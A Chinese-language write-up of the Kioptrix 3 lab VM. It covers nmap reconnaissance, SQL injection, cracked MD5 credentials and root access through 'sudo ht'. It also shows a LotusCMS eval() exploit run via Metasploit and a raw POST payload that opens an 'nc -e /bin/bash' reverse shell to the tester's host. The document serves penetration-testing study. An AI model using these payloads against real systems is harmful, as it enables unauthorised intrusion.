# 1. kioptrix11-24

## 1.1. 信息收集


### 1. nmap存活主机扫描

~~~shell
# Nmap 7.92 scan initiated Sat May  7 11:07:22 2022 as: nmap -sn -oN pingscan.text 192.168.42.0/24
Nmap scan report for 192.168.42.1
Host is up (0.0010s latency).
MAC Address: A6:5E:60:2C:96:68 (Unknown)
Nmap scan report for 192.168.42.2
Host is up (0.0010s latency).
MAC Address: 00:50:56:FE:66:AF (VMware)
Nmap scan report for kioptrix3.com (192.168.42.134)
Host is up (0.0017s latency).
MAC Address: 00:0C:29:10:00:A9 (VMware)
Nmap scan report for 192.168.42.254
Host is up (0.00085s latency).
MAC Address: 00:50:56:E5:AF:8D (VMware)
Nmap scan report for 192.168.42.132
Host is up.
# Nmap done at Sat May  7 11:07:26 2022 -- 256 IP addresses (5 hosts up) scanned in 4.02 seconds
~~~

### 2. 端口扫描、指纹识别

~~~shell
# Nmap 7.92 scan initiated Sat May  7 11:13:28 2022 as: nmap -n -v -sV -A -sC -T5 -p- -Pn -oN portscan.text 192.168.42.134
Nmap scan report for 192.168.42.134
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Ligoat Security - Got Goat? Security ...
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
MAC Address: 00:0C:29:10:00:A9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.139 days (since Sat May  7 07:53:44 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=204 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.29 ms 192.168.42.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  7 11:13:51 2022 -- 1 IP address (1 host up) scanned in 23.31 seconds
~~~

> 只开放了两个端口，80和22

访问网页，找到一个sql注入点

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/1.png" width="56%" />



<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/2.png" width="56%" />



<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/3.png" width="56%" />

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/4.png" width="56%" />

> 最终拿到几个账号：
>
> 1;dreg;0d3eccfb887aabd50f243b3f155c0f85,
> 2;loneferret;5badcaf789d3d1d09794d8f021f40f0e
> 1:admin:n0t7t1k4
>
> 

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/5.png" width="56%" />

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/6.png" width="56%" />

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/7.png" width="56%" />



## 1.2. 过程

### 1. 思路一

> md5解密：
>
> |  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |    Mast3r
> |  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |   starwars

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/8.png" width="56%" />





> 两个账号都可以ssh登录成功

~~~shell
dreg@Kioptrix3:~$ cd ..
-rbash: cd: restricted
dreg@Kioptrix3:~$ 
~~~

~~~shell
loneferret@Kioptrix3:~$ ls -al
total 68
drwxr-xr-x 3 loneferret loneferret  4096 2022-05-07 13:14 .
drwxr-xr-x 5 root       root        4096 2011-04-16 07:54 ..
-rw-r--r-- 1 loneferret users        107 2022-05-07 21:14 .bash_history
-rw-r--r-- 1 loneferret loneferret   220 2011-04-11 17:00 .bash_logout
-rw-r--r-- 1 loneferret loneferret  2940 2011-04-11 17:00 .bashrc
-rwxrwxr-x 1 root       root       26275 2011-01-12 10:45 checksec.sh
-rw-r--r-- 1 root       root         224 2011-04-16 08:51 CompanyPolicy.README
-rw-r--r-- 1 root       root        1692 2022-05-07 20:18 .htcfg2
-rw------- 1 root       root          15 2011-04-15 21:21 .nano_history
-rw-r--r-- 1 loneferret loneferret   586 2011-04-11 17:00 .profile
drwx------ 2 loneferret loneferret  4096 2011-04-14 11:05 .ssh
-rw-r--r-- 1 loneferret loneferret     0 2011-04-11 18:00 .sudo_as_admin_successful
loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
~~~

> Google "Error opening terminal: xterm-256color."
>
> 解决办法是：export TERM=xterm
>
> 然后再:sudo ht

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/9.png" width="56%" />



<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/10.png" width="56%" />



~~~bash
loneferret@Kioptrix3:~$ sudo /bin/bash
root@Kioptrix3:~# whoami
root
root@Kioptrix3:~# 
~~~

### 2. 思路二 lotusCMS

<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/11.png" width="56%" />

~~~shell
msf6 > search lotusCMS

Matching Modules
================

   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/lcms_php_exec

use exploit/multi/http/lcms_php_exec
set payload /php/reverse_php
msf6 exploit(multi/http/lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting         Required  Description
   ----     ---------------         --------  -----------
   Proxies  http:192.168.42.1:8888  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.42.134          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    80                      yes       The target port (TCP)
   SSL      false                   no        Negotiate SSL/TLS for outgoing connections
   URI      /                       yes       URI
   VHOST                            no        HTTP server virtual host


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.42.132   yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf6 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 192.168.42.132:5555
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Command shell session 5 opened (192.168.42.132:5555 -> 192.168.42.134:59440 ) at 2022-05-08 02:28:03 -0400

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

> 但是我不推荐用这种无脑方式，还是推荐burpsuite方式
>
> https://vk9-sec.com/lotuscms-3-0-eval-remote-command-execution/
>
> ~~~shell
> POST /index.php HTTP/1.1
> Host: kioptrix3.com
> Upgrade-Insecure-Requests: 1
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
> Accept-Encoding: gzip, deflate
> Accept-Language: zh-CN,zh;q=0.9
> Cookie: __gsas=ID=b24ce1a6b7306995:T=1651919057:S=ALNI_MazTELVzPFvH_OPLm9MJsanYZCmpA; PHPSESSID=06d54e4ee4e86963349df36a0b47cd42
> Connection: close
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 61
> 
> page=index');${system("nc -e /bin/bash 192.168.42.132 53")};#
> ~~~



<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-24/images/12.png" width="56%" />











## 1.3. 未解决问题
> 1. 无用账号信息
> 1:admin:n0t7t1k4
> 这个账号是干啥用的，无用线索吗？？

> 2. 提权问题
> ~~~shell
> -rw-r--r-- 1 root root 14963 May  7 06:41 14814.c
> -rw-r--r-- 1 root root  8472 May  7 07:05 15150.c
> -rw-r--r-- 1 root root  7023 May  7 06:38 15774.c
> -rw-r--r-- 1 root root  8812 May  7 05:54 15916.c
> -rw-r--r-- 1 root root 14293 May  7 06:59 17787.c
> -rw-r--r-- 1 root root 15329 May  7 05:31 33321.c
> -rw-r--r-- 1 root root  4803 May  7 05:26 40616.c
> -rw-r--r-- 1 root root  8322 May  7 05:44 41760.txt
> ~~~
> 尝试了以上所有提权脚本，都不成功，难道把该版本的所有的内核漏洞都修复了？\_/


## 1.4. 说明

